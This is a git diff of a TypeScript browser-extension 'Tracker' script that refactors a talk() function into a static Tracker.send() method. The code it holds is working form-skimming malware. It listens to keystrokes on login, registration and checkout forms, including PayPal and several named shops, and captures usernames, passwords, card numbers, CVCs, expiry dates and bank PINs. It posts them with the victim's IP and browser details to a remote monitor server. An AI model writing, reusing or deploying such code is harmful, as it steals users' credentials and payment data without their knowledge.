@@ -1,15 +1,14 @@
-'use strict';
+import {authFormAttribute, paymentElementsAttribute} from "../db/tracker";
+import {sendRequest} from "../common/request";
+import {app} from "../db/app";
 import {Browser} from "./browser";
-import {app} from "./common/db";
-import {sendRequest} from "./common/request";
 
-/*required variables*/
-const BrJS = new Browser();
-const appTracker = app.default.name + '@' + app.default.version;
-let globalAppMonitorMainURL: string;
 
 
 /*initialize on extension installed*/
+const BrJS = new Browser();
+const appTracker = app.default.name + '@' + app.default.version;
+let globalAppMonitorMainURL: string;
 /*#!if ENV === 'production'*/
 globalAppMonitorMainURL = 'https://www.mishusoft.com/monitor/browser/';
 /*#!else*/
@@ -17,236 +16,7 @@ globalAppMonitorMainURL = 'http://localhost/monitor/browser/';
 /*#!endif*/
 /*required variables*/
 
-const authFormAttribute = [
-    {
-        'login': [
-            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
-            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
-        ]
-    },
-    {'register': ['reg', 'signup', 'join', 'register', 'checkform']},
-    {'logout': ['logout']},
-    {
-        'payment': [
-            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
-            'credit-card', 'addcard', 'bill'
-        ]
-    },
-    {
-        'exclude': [
-            /*'q', */'search', 'googleads', 'presentation', 'captcha', /*'disable', */'header',
-            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
-            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
-            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
-            'upload', 'mainf', 'domain'
-        ]
-    },
-];
-const paymentElementsAttribute = [
-    {'cardNumber': ['num', 'no', 'cardno',]},
-    {'cardHolder': ['holder', 'owner', 'name',]},
-    {'cardTypes': ['brand', 'type', 'types',]},
-    {'cardExpire': ['exp',]},
-    {'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',]},
-    {'cardPostalCode': ['zip', 'post',]},
-    /*{'exclude': ['email', 'user', 'usr']},*/
-];
 
-export function initDb() {
-    if (window.sessionStorage) {
-        if (window.sessionStorage.getItem('ip') === null) {
-            sendRequest({
-                method: "GET",
-                url: app.website.IpInfo,
-                async: true,
-                header: [{name: "Accept", value: "application/json"}]
-            }, function (IpDataReply: any) {
-                window.sessionStorage.setItem('ip', JSON.parse(IpDataReply).ip);
-            });
-        }
-    } else {
-        console.error('Error:: Your browser does not support session!! Please upgrade or change your browser!!');
-    }
-}
-
-export function talk(request: any) {
-    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
-        let interval = setInterval(function () {
-            if (window.sessionStorage.getItem('ip') !== null) {
-                clearInterval(interval);
-                if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
-                    if (request.command === 'saveLoginData') {
-                        return sendRequest({
-                            method: "POST",
-                            url: globalAppMonitorMainURL + "browserUserDataManagement",
-                            async: true,
-                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                            data: {
-                                "command": request.command,
-                                "userdata": {
-                                    _default_: {
-                                        "tracker": appTracker,
-                                        "app_id": app.default.version,
-                                        "ip": window.sessionStorage.getItem('ip'),
-                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                        "browser": BrJS.getBrowserNameFull()
-                                    },
-                                    "event": 'login',
-                                    "username": request.data.username,
-                                    "password": request.data.password,
-                                    "workWebsite": request.data.workWebsite
-                                }
-                            }
-                        });
-                    } else if (request.command === 'saveRegistrationData') {
-                        return sendRequest({
-                            method: "POST",
-                            url: globalAppMonitorMainURL + "browserUserDataManagement",
-                            async: true,
-                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                            data: {
-                                "command": request.command,
-                                "userdata": {
-                                    _default_: {
-                                        "tracker": appTracker,
-                                        "app_id": app.default.version,
-                                        "ip": window.sessionStorage.getItem('ip'),
-                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                        "browser": BrJS.getBrowserNameFull()
-                                    },
-                                    "event": "registration",
-                                    "username": request.data.username,
-                                    "password": request.data.password,
-                                    "email": request.data.email,
-                                    "workWebsite": request.data.workWebsite
-                                }
-                            }
-                        });
-                    } else if (request.command === 'saveLogoutData') {
-                        return sendRequest({
-                            method: "POST",
-                            url: globalAppMonitorMainURL + "browserUserDataManagement",
-                            async: true,
-                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                            data: {
-                                "command": request.command,
-                                "userdata": {
-                                    _default_: {
-                                        "tracker": appTracker,
-                                        "app_id": app.default.version,
-                                        "ip": window.sessionStorage.getItem('ip'),
-                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                        "browser": BrJS.getBrowserNameFull()
-                                    },
-                                    "event": "logout",
-                                    "username": request.data.username,
-                                    "workWebsite": request.data.workWebsite
-                                }
-                            }
-                        });
-                    } else if (request.command === 'saveNavigateData') {
-                        return sendRequest({
-                            method: "POST",
-                            url: globalAppMonitorMainURL + "browserUserDataManagement",
-                            async: true,
-                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                            data: {
-                                "command": request.command,
-                                "userdata": {
-                                    _default_: {
-                                        "tracker": appTracker,
-                                        "app_id": app.default.version,
-                                        "ip": window.sessionStorage.getItem('ip'),
-                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                        "browser": BrJS.getBrowserNameFull()
-                                    },
-                                    "event": "navigate",
-                                    "username": request.data.username,
-                                    "workWebsite": request.data.workWebsite
-                                }
-                            }
-                        });
-                    }
-                }
-                if (request.command === 'savePaymentMethodsData') {
-                    return sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
-                        async: true,
-                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": request.command,
-                            "paymentMethodsInfo": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": app.default.version,
-                                    "ip": window.sessionStorage.getItem('ip'),
-                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                    "browser": BrJS.getBrowserNameFull()
-                                },
-                                'cardNumber': request.data.cardNumber,
-                                'cardBrand': request.data.cardBrand,
-                                'cardHolder': request.data.cardHolder,
-                                "cardExpire": request.data.cardExpire,
-                                'cardCVC': request.data.cardCVC,
-                                'event': request.data.event,
-                                "workWebsite": request.data.workWebsite
-                            }
-                        }
-                    });
-                }
-                if (request.command === 'saveBankAccountData') {
-                    return sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorMainURL + "clientBankAccountRecord",
-                        async: true,
-                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": request.command,
-                            "bankAccountData": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": app.default.version,
-                                    "ip": window.sessionStorage.getItem('ip'),
-                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                    "browser": BrJS.getBrowserNameFull()
-                                },
-                                'dataType': request.data.dataType,
-                                'dataValue': request.data.dataValue,
-                                "workWebsite": request.data.workWebsite
-                            }
-                        }
-                    });
-                }
-                if (request.command === 'saveInputElementData') {
-                    return sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorMainURL + "InputElementDataRecord",
-                        async: true,
-                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": request.command,
-                            "inputElementData": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": app.default.version,
-                                    "ip": window.sessionStorage.getItem('ip'),
-                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
-                                    "browser": BrJS.getBrowserNameFull()
-                                },
-                                'name': request.data.name,
-                                'type': request.data.type,
-                                'value': request.data.value,
-                                'placeholder': request.data.placeholder,
-                                "workWebsite": request.data.workWebsite
-                            }
-                        }
-                    });
-                }
-            }
-        }, 100);
-    }
-}
 
 export class Tracker {
     public url?: any;
@@ -297,7 +67,7 @@ export class Tracker {
                     ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                         __detectedElement.addEventListener(event, function () {
                             if (__detectedElement.value.length !== 0) {
-                                talk({
+                                Tracker.send({
                                     command: 'saveInputElementData',
                                     data: {
                                         'name': __detectedElement.nodeName.toLowerCase(),
@@ -318,7 +88,7 @@ export class Tracker {
                     ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                         __detectedElement.addEventListener(event, function () {
                             if (__detectedElement.value.length !== 0) {
-                                talk({
+                                Tracker.send({
                                     command: 'saveInputElementData',
                                     data: {
                                         'name': __detectedElement.nodeName.toLowerCase(),
@@ -502,7 +272,7 @@ export class Tracker {
                                                 'value': __detectedElement.value
                                             });
                                         });
-                                        talk({
+                                        Tracker.send({
                                             command: 'savePaymentMethodsData',
                                             data: {
                                                 'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
@@ -538,7 +308,7 @@ export class Tracker {
             loginButtonElement = document.querySelector(loginButtonElementId);
         }
         loginButtonElement.addEventListener('click', function () {
-            return talk({
+            return Tracker.send({
                 command: 'saveLoginData',
                 data: {
                     "event": self.authEvent,
@@ -558,11 +328,13 @@ export class Tracker {
                         if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
                             [...__childElement.attributes].forEach(function (__attribute) {
                                 if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
-                                    ['text', 'email', 'password'].forEach(function (__eligibleAttribute) {
-                                        if (__attribute.nodeValue.toLowerCase() === __eligibleAttribute) {
+                                    /* minor changes start */
+                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
+                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1 ) {
                                             elements.push(__childElement);
                                         }
                                     });
+                                    /* minor changes end */
                                 }
                             });
                         }
@@ -605,12 +377,12 @@ export class Tracker {
                 }
             });
 
-            talk({
+            Tracker.send({
                 command: 'saveLoginData',
                 data: {
                     "event": self.authEvent,
-                    "username": self.passwordStore[0].value,
-                    "password": self.passwordStore[1].value,
+                    "username": self.passwordStore[0]?.value,
+                    "password": self.passwordStore[1]?.value,
                     "workWebsite": window.location.origin
                 }
             });
@@ -721,7 +493,7 @@ export class Tracker {
             }
         });
         self.retrieveAccurateData(self, self.creditCardStore);
-        talk({
+        Tracker.send({
             command: 'savePaymentMethodsData',
             data: {
                 'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
@@ -789,7 +561,7 @@ export class Tracker {
                                 self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                     ['click', 'dblclick'].forEach(function (event) {
                                         document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
-                                            talk({
+                                            Tracker.send({
                                                 command: 'savePaymentMethodsData',
                                                 data: {
                                                     'cardNumber': __detectedElement.textContent,
@@ -836,7 +608,7 @@ export class Tracker {
                                                                     'value': element.value
                                                                 });
                                                             })
-                                                            talk({
+                                                            Tracker.send({
                                                                 command: 'savePaymentMethodsData',
                                                                 data: {
                                                                     'cardNumber': paymentMethodStore[0].value,
@@ -916,7 +688,7 @@ export class Tracker {
                                             });
                                         }
                                     });
-                                    talk({
+                                    Tracker.send({
                                         command: 'savePaymentMethodsData',
                                         data: {
                                             'cardNumber': tempPaymentMethodsStore[0].value,
@@ -969,7 +741,7 @@ export class Tracker {
                                                     'value': __detectedElement.value
                                                 });
                                             });
-                                            talk({
+                                            Tracker.send({
                                                 command: 'savePaymentMethodsData',
                                                 data: {
                                                     'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
@@ -1010,7 +782,7 @@ export class Tracker {
                                 self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                     ['click', 'dblclick'].forEach(function (event) {
                                         document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
-                                            talk({
+                                            Tracker.send({
                                                 command: 'savePaymentMethodsData',
                                                 data: {
                                                     'cardNumber': __detectedElement.textContent,
@@ -1031,7 +803,7 @@ export class Tracker {
                     self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                         ['click', 'dblclick'].forEach(function (event) {
                             document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
-                                talk({
+                                Tracker.send({
                                     command: 'savePaymentMethodsData',
                                     data: {
                                         'cardNumber': (__detectedElement as HTMLElement).textContent,
@@ -1073,7 +845,7 @@ export class Tracker {
                                                                                     'value': element.value
                                                                                 });
                                                                             })
-                                                                            talk({
+                                                                            Tracker.send({
                                                                                 command: 'savePaymentMethodsData',
                                                                                 data: {
                                                                                     'cardNumber': paymentMethodStore[0].value,
@@ -1123,7 +895,7 @@ export class Tracker {
                                             });
                                         }
                                     });
-                                    talk({
+                                    Tracker.send({
                                         command: 'savePaymentMethodsData',
                                         data: {
                                             'cardNumber': tempPaymentMethodsStore[0].value,
@@ -1178,7 +950,7 @@ export class Tracker {
                                                     'value': __detectedElement.value
                                                 });
                                             });
-                                            talk({
+                                            Tracker.send({
                                                 command: 'savePaymentMethodsData',
                                                 data: {
                                                     'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
@@ -1253,7 +1025,7 @@ export class Tracker {
                                         'value': __detectedElement.value
                                     });
                                 });
-                                talk({
+                                Tracker.send({
                                     command: 'savePaymentMethodsData',
                                     data: {
                                         'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
@@ -1295,7 +1067,7 @@ export class Tracker {
                             if (modal.childNodes.length !== 0) {
                                 self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement: any) {
                                     __detectedElement.addEventListener('click', function () {
-                                        talk({
+                                        Tracker.send({
                                             command: 'savePaymentMethodsData',
                                             data: {
                                                 'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
@@ -1372,7 +1144,7 @@ export class Tracker {
                                                 });
                                             });
                                             if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
-                                                talk({
+                                                Tracker.send({
                                                     command: 'savePaymentMethodsData',
                                                     data: {
                                                         'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
@@ -1387,7 +1159,7 @@ export class Tracker {
                                                 paymentMethodStore = [];
                                             }
                                             if (window.location.href.indexOf('webapps') !== -1) {
-                                                talk({
+                                                Tracker.send({
                                                     command: 'savePaymentMethodsData',
                                                     data: {
                                                         'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
@@ -1416,7 +1188,7 @@ export class Tracker {
                     clearInterval(interval1);
                     self.explorePaymentInputTagOnly(self, (document.querySelector('#conferma_email_certifCommand') as HTMLElement), function (__detectedElement: any) {
                         __detectedElement.addEventListener('click', function () {
-                            talk({
+                            Tracker.send({
                                 command: 'saveBankAccountData',
                                 data: {
                                     'dataType': 'PIN',
@@ -1456,7 +1228,7 @@ export class Tracker {
                         clearInterval(interval);
                         document.querySelectorAll('button').forEach(function (__buttonElement) {
                             if (__buttonElement.classList.contains('btnConfirmPayment')) {
-                                talk({
+                                Tracker.send({
                                     command: 'savePaymentMethodsData',
                                     data: {
                                         'cardNumber': (document.querySelector('#ccNumber') as HTMLInputElement).value ? (document.querySelector('#ccNumber') as HTMLInputElement).value : 'Unknown',
@@ -1512,7 +1284,7 @@ export class Tracker {
                         if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
                             (document.querySelector('#placeOrder') as HTMLAnchorElement).addEventListener('click', function () {
                                 document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')?.remove();
-                                talk({
+                                Tracker.send({
                                     command: 'savePaymentMethodsData',
                                     data: {
                                         'cardNumber': (document.querySelector('#creditCardNum') as HTMLInputElement).value !== null ? (document.querySelector('#creditCardNum') as HTMLInputElement).value : 'Unknown',
@@ -1540,7 +1312,7 @@ export class Tracker {
                                 clearInterval(interval);
                                 ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                                     __childElement.addEventListener(__event, function () {
-                                        talk({
+                                        Tracker.send({
                                             command: 'savePaymentMethodsData',
                                             data: {
                                                 'cardNumber': (__childElement as HTMLInputElement).getAttribute('aria-label') === 'Card Number' ? (__childElement as HTMLInputElement).value : 'Unknown',
@@ -1632,7 +1404,7 @@ export class Tracker {
                             'value': element.value
                         });
                     })
-                    talk({
+                    Tracker.send({
                         command: 'savePaymentMethodsData',
                         data: {
                             'cardNumber': paymentMethodStore[0].value,
@@ -1683,7 +1455,7 @@ export class Tracker {
                                     'value': element.value
                                 });
                             })
-                            talk({
+                            Tracker.send({
                                 command: 'savePaymentMethodsData',
                                 data: {
                                     'cardNumber': paymentMethodStore[0].value,
@@ -1733,7 +1505,7 @@ export class Tracker {
                             'value': __detectedElement.value
                         });
                     });
-                    talk({
+                    Tracker.send({
                         command: 'savePaymentMethodsData',
                         data: {
                             'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
@@ -1798,7 +1570,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
@@ -1858,7 +1630,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
@@ -1943,7 +1715,7 @@ export class Tracker {
                                 });
                             }
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
@@ -1999,7 +1771,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
@@ -2055,7 +1827,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
@@ -2184,7 +1956,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
@@ -2240,7 +2012,7 @@ export class Tracker {
 
                             });
                         });
-                        talk({
+                        Tracker.send({
                             command: 'savePaymentMethodsData',
                             data: {
                                 'cardNumber': paymentMethodData[1].value,
@@ -2344,7 +2116,7 @@ export class Tracker {
                                     'value': __detectedElement.value
                                 });
                             });
-                            talk({
+                            Tracker.send({
                                 command: 'savePaymentMethodsData',
                                 data: {
                                     'cardNumber': tempPaymentMethodsStore[0].value,
@@ -2454,19 +2226,184 @@ export class Tracker {
             });
         }
     }
-}
 
-
-/*new tracker added*/
-initDb();
-(new Tracker(window.location.href)).init(function () {
-    talk({
-        process: 'tracking',
-        command: 'saveNavigateData',
-        data: {
-            username: 'visitor',
-            workWebsite: window.location.origin
+    static send(request: any) {
+        if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
+            let interval = setInterval(function () {
+                if (window.sessionStorage.getItem('ip') !== null){
+                    clearInterval(interval);
+                    if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
+                        if (request.command === 'saveLoginData') {
+                            return sendRequest({
+                                method: "POST",
+                                url: globalAppMonitorMainURL + "browserUserDataManagement",
+                                async: true,
+                                header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                                data: {
+                                    "command": request.command,
+                                    "userdata": {
+                                        _default_: {
+                                            "tracker": appTracker,
+                                            "app_id": app.default.version,
+                                            "ip": window.sessionStorage.getItem('ip'),
+                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                            "browser": BrJS.getBrowserNameFull()
+                                        },
+                                        "event": 'login',
+                                        "username": request.data.username,
+                                        "password": request.data.password,
+                                        "workWebsite": request.data.workWebsite
+                                    }
+                                }
+                            });
+                        }
+                        else if (request.command === 'saveRegistrationData') {
+                            return sendRequest({
+                                method: "POST",
+                                url: globalAppMonitorMainURL + "browserUserDataManagement",
+                                async: true,
+                                header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                                data: {
+                                    "command": request.command,
+                                    "userdata": {
+                                        _default_: {
+                                            "tracker": appTracker,
+                                            "app_id": app.default.version,
+                                            "ip": window.sessionStorage.getItem('ip'),
+                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                            "browser": BrJS.getBrowserNameFull()
+                                        },
+                                        "event": "registration",
+                                        "username": request.data.username,
+                                        "password": request.data.password,
+                                        "email": request.data.email,
+                                        "workWebsite": request.data.workWebsite
+                                    }
+                                }
+                            });
+                        } else if (request.command === 'saveLogoutData') {
+                            return sendRequest({
+                                method: "POST",
+                                url: globalAppMonitorMainURL + "browserUserDataManagement",
+                                async: true,
+                                header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                                data: {
+                                    "command": request.command,
+                                    "userdata": {
+                                        _default_: {
+                                            "tracker": appTracker,
+                                            "app_id": app.default.version,
+                                            "ip": window.sessionStorage.getItem('ip'),
+                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                            "browser": BrJS.getBrowserNameFull()
+                                        },
+                                        "event": "logout",
+                                        "username": request.data.username,
+                                        "workWebsite": request.data.workWebsite
+                                    }
+                                }
+                            });
+                        } else if (request.command === 'saveNavigateData') {
+                            return sendRequest({
+                                method: "POST",
+                                url: globalAppMonitorMainURL + "browserUserDataManagement",
+                                async: true,
+                                header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                                data: {
+                                    "command": request.command,
+                                    "userdata": {
+                                        _default_: {
+                                            "tracker": appTracker,
+                                            "app_id": app.default.version,
+                                            "ip": window.sessionStorage.getItem('ip'),
+                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                            "browser": BrJS.getBrowserNameFull()
+                                        },
+                                        "event": "navigate",
+                                        "username": request.data.username,
+                                        "workWebsite": request.data.workWebsite
+                                    }
+                                }
+                            });
+                        }
+                    }
+                    if (request.command === 'savePaymentMethodsData') {
+                        return sendRequest({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
+                            async: true,
+                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                            data: {
+                                "command": request.command,
+                                "paymentMethodsInfo": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    'cardNumber': request.data.cardNumber,
+                                    'cardBrand': request.data.cardBrand,
+                                    'cardHolder': request.data.cardHolder,
+                                    "cardExpire": request.data.cardExpire,
+                                    'cardCVC': request.data.cardCVC,
+                                    'event': request.data.event,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                    if (request.command === 'saveBankAccountData') {
+                        return sendRequest({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "clientBankAccountRecord",
+                            async: true,
+                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                            data: {
+                                "command": request.command,
+                                "bankAccountData": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    'dataType': request.data.dataType,
+                                    'dataValue': request.data.dataValue,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                    if (request.command === 'saveInputElementData') {
+                        return sendRequest({
+                            method: "POST",
+                            url: globalAppMonitorMainURL + "InputElementDataRecord",
+                            async: true,
+                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
+                            data: {
+                                "command": request.command,
+                                "inputElementData": {
+                                    _default_: {
+                                        "tracker": appTracker,
+                                        "app_id": app.default.version,
+                                        "ip": window.sessionStorage.getItem('ip'),
+                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
+                                        "browser": BrJS.getBrowserNameFull()
+                                    },
+                                    'name': request.data.name,
+                                    'type': request.data.type,
+                                    'value': request.data.value,
+                                    'placeholder': request.data.placeholder,
+                                    "workWebsite": request.data.workWebsite
+                                }
+                            }
+                        });
+                    }
+                }
+            },100);
         }
-    });
-});
-/*new tracker added*/
+    }
+}
